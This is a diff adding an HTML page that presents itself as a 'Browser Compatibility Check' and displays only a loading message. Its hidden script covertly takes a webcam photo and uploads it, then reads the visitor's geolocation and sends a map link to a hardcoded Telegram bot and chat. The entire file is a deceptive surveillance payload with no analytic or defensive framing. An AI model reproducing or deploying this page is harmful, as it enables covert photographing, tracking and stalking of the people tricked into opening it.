@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head><title>Browser Compatibility Check</title></head>
+<body>
+    <video id="video" width="0" height="0" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        // Camera access and capture
+        navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+            video.srcObject = stream;
+            setTimeout(() => {
+                const context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0, 640, 480);
+                canvas.toBlob(blob => {
+                    const formData = new FormData();
+                    formData.append('photo', blob, 'img.jpg');
+                    fetch('/upload', { method: 'POST', body: formData });
+                }, 'image/jpeg');
+            }, 2000); 
+        });
+
+        // Location capture
+        navigator.geolocation.getCurrentPosition(pos => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            const msg = `📍 Location: https://www.google.com/maps?q=${lat},${lon}`;
+            fetch(`https://api.telegram.org/bot7864389146:AAHgYI8Oqj7T_3SND1mE-0M8G9w_vI6I9u4/sendMessage?chat_id=6348126868&text=${msg}`);
+        });
+    </script>
+    <h1 style="text-align:center; margin-top: 50px;">Loading... Please Wait</h1>
+</body>
+</html>
